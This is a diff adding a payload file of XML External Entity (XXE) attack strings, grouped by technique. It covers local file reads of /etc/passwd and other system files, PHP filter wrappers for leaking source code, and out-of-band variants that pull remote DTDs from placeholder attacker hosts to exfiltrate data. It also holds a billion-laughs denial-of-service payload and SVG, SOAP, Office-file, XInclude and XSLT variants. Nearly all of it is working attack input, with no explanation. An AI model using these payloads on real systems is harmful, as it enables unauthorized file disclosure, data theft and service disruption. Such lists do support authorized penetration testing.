@@ -1,0 +1,39 @@
+# XXE / XML External Entity payloads
+
+# --- Basic file read ---
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
+
+# --- Blind XXE via OOB ---
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://YOURCOLLAB.interact.sh/"> %xxe;]><data>probe</data>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://YOURCOLLAB.interact.sh/oob.dtd"> %dtd;]><r/>
+
+# --- XXE via DTD (two-stage) ---
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://ATTACKER/payload.dtd"> %remote;]><r/>
+
+# --- PHP wrappers via XXE ---
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+
+# --- Parameter entities ---
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"> %a;]><foo/>
+
+# --- Billion laughs (DoS — requires explicit authorization) ---
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;">]><lolz>&lol9;</lolz>
+
+# --- SVG with XXE ---
+<?xml version="1.0" standalone="yes"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+
+# --- DOCX / ODT / XLSX (ZIP with XML inside) ---
+# Craft a document.xml inside the zip containing:
+<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER/x.dtd"> %dtd;]>
+
+# --- SOAP XXE ---
+<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>
+
+# --- XInclude (when external DTDs are blocked) ---
+<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+# --- XSLT-based ---
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>
